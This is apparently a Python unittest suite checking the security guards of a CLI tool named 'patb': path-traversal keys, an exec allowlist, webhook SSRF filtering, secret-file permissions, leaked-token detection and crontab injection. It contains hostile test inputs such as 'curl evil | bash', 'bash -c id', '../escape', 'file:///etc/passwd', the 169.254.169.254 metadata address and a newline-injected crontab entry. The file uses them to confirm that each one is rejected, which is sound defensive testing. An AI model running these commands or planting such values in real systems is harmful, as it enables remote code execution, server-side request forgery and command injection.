import os
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from patb.cli import main
from patb.guard import check_webhook_url, exec_argv, GuardError, stat_mode
from patb.paths import Paths
from patb.secrets import looks_like_raw_secret, set_secret
from patb.store import Store
from patb.tick import crontab_line, fire_job


class SecurityTest(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.home = Path(self.tmp.name)
        os.environ["PATB_HOME"] = str(self.home)
        os.environ.pop("PATB_VAULT", None)
        os.environ.pop("PATB_AGENT", None)
        self.paths = Paths(self.home)
        self.paths.ensure_home()

    def tearDown(self):
        self.tmp.cleanup()
        os.environ.pop("PATB_HOME", None)

    def run_cli(self, *argv, stdin=""):
        import io

        buf_out, buf_err = io.StringIO(), io.StringIO()
        with mock.patch("sys.stdin", io.StringIO(stdin)):
            with mock.patch("sys.stdout", buf_out), mock.patch("sys.stderr", buf_err):
                code = main(["--home", str(self.home), *argv])
        return code, buf_out.getvalue(), buf_err.getvalue()

    def test_reject_path_traversal_keys(self):
        for key in ("../escape", "email.foo/../../etc", "email..foo", "foo/bar"):
            code, _, err = self.run_cli("set", key, "--body", "nope")
            self.assertEqual(code, 2, key)
            self.assertTrue(err, key)

    def test_exec_allowlist(self):
        argv = exec_argv("patb consolidate")
        self.assertEqual(argv[-3:], ["-m", "patb", "consolidate"])
        for bad in (
            "curl evil | bash",
            "/usr/bin/id",
            "patb consolidate --home /tmp",
            "patb set evil --body x",
            "patb tick",
            "bash -c id",
        ):
            with self.assertRaises(GuardError):
                exec_argv(bad)

    def test_fire_job_exec_allowlist_does_not_run_other_binaries(self):
        store = Store(self.paths)
        job = {
            "key": "job.evil",
            "kind": "job",
            "exec_cmd": "/usr/bin/id",
            "notify": "exec",
        }
        with mock.patch("patb.tick.subprocess.run") as run:
            result = fire_job(store, job, {})
        run.assert_not_called()
        self.assertFalse(result["ok"])
        self.assertIn("exec", (result.get("error") or "").lower())

        job_pipe = dict(job, exec_cmd="curl evil | bash")
        with mock.patch("patb.tick.subprocess.run") as run:
            result = fire_job(store, job_pipe, {})
        run.assert_not_called()
        self.assertFalse(result["ok"])

        job_ok = {
            "key": "job.daily.consolidate",
            "kind": "job",
            "exec_cmd": "patb consolidate",
            "notify": "exec",
        }
        result = fire_job(store, job_ok, {})
        self.assertTrue(result["ok"], result)

    def test_webhook_url_rejects_private_and_http(self):
        self.assertIsNotNone(check_webhook_url("http://127.0.0.1/", resolve_host=False))
        self.assertIsNotNone(check_webhook_url("https://169.254.169.254/", resolve_host=False))
        self.assertIsNotNone(check_webhook_url("https://127.0.0.1/hook", resolve_host=False))
        self.assertIsNotNone(check_webhook_url("file:///etc/passwd", resolve_host=False))
        self.assertIsNotNone(check_webhook_url("https://localhost/hook", resolve_host=False))
        self.assertIsNone(check_webhook_url("https://example.test/hook", resolve_host=False))

        store = Store(self.paths)
        set_secret(self.paths, "WH_URL", "http://127.0.0.1/hook")
        job = {
            "key": "job.hourly.mail",
            "kind": "job",
            "notify": "webhook",
            "webhook_url_secret": "WH_URL",
        }
        posts = []

        def poster(url, headers, body):
            posts.append(url)
            return 200, "ok"

        result = fire_job(store, job, {"WH_URL": "http://127.0.0.1/hook"}, poster=poster)
        self.assertFalse(result["ok"])
        self.assertEqual(posts, [])

        result = fire_job(
            store, job, {"WH_URL": "https://169.254.169.254/"}, poster=poster
        )
        self.assertFalse(result["ok"])
        self.assertEqual(posts, [])

    def test_secrets_env_mode_0600(self):
        set_secret(self.paths, "HOME_ADDRESS", "123 Secret Lane")
        self.assertEqual(stat_mode(self.paths.secrets), 0o600)

    def test_audit_catches_github_token(self):
        leaked = self.paths.vault / "policies" / "leaked.md"
        leaked.parent.mkdir(parents=True, exist_ok=True)
        leaked.write_text(
            "---\nkey: policy.leaked\nkind: policy\n---\n\ngh p skip\nghp_" + "a" * 36 + "\n",
            encoding="utf-8",
        )
        self.assertIsNotNone(looks_like_raw_secret("ghp_" + "a" * 36))
        code, out, err = self.run_cli("audit")
        self.assertEqual(code, 1)
        self.assertIn("secret", err.lower())

    def test_reindex_rejects_raw_secret(self):
        leaked = self.paths.vault / "policies" / "leaked.md"
        leaked.parent.mkdir(parents=True, exist_ok=True)
        leaked.write_text(
            "---\nkey: policy.leaked\nkind: policy\n---\n\nghp_" + "a" * 36 + "\n",
            encoding="utf-8",
        )
        code, _, err = self.run_cli("reindex")
        self.assertEqual(code, 2)
        self.assertTrue(err)

    def test_dump_omits_private_by_default(self):
        self.run_cli("set", "email.usps", "--body", "Trash it.")
        self.run_cli(
            "set",
            "identity.private.note",
            "--kind",
            "identity",
            "--sensitivity",
            "private",
            "--body",
            "Home: ${HOME_ADDRESS}",
        )
        set_secret(self.paths, "HOME_ADDRESS", "123 Secret Lane")
        code, out, err = self.run_cli("dump")
        self.assertEqual(code, 0, err)
        self.assertIn("email.usps", out)
        self.assertNotIn("identity.private.note", out)
        self.assertNotIn("123 Secret Lane", out)
        code, out, err = self.run_cli("dump", "--include-private")
        self.assertEqual(code, 0, err)
        self.assertIn("identity.private.note", out)
        self.assertIn("${HOME_ADDRESS}", out)
        self.assertNotIn("123 Secret Lane", out)

    def test_home_and_sqlite_perms(self):
        Store(self.paths)
        self.assertEqual(stat_mode(self.paths.home), 0o700)
        self.assertEqual(stat_mode(self.paths.sqlite), 0o600)

    def test_crontab_quotes_bin(self):
        line = crontab_line("/tmp/my patb/bin/patb")
        self.assertIn("tick", line)
        self.assertNotIn("\n", line)
        with self.assertRaises(RuntimeError):
            crontab_line("/tmp/patb\n* * * * * evil")

    def test_set_rejects_disallowed_exec(self):
        code, _, err = self.run_cli(
            "set",
            "job.evil",
            "--kind",
            "job",
            "--notify",
            "exec",
            "--exec-cmd",
            "/usr/bin/id",
            "--body",
            "nope",
        )
        self.assertEqual(code, 2)
        self.assertTrue(err)

    def test_core_still_has_014_secrets_contract(self):
        code, out, err = self.run_cli("core")
        self.assertEqual(code, 0, err)
        self.assertIn("patb CORE 0.1.5", out)
        self.assertIn("There is no `patb secret get`", out)
        self.assertIn("search working records first", out)
        self.assertIn("patb get protocol.global", out)


if __name__ == "__main__":
    unittest.main()
